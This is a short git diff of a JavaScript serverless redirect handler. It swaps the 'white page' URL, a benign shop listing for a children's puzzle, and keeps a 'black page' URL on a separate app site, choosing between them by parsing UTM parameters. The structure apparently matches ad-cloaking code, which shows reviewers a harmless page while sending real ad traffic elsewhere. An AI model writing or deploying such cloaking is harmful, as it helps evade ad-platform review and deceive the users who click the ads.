@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/roba-laufgitter-6-eckig-mobiles-laufgitter-mit-rollen-aus-holz-verschiedene-designs-laufstall-inkl-schutzeinlage-bremsrollen-6-fach-hoehenverstellbar-C1723923917/?variationId=S0X6O073XYM2";
+    const whitePageURL = "https://www.littlethingz.be/en/janod-puzzle-fireman-24-pieces.html";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
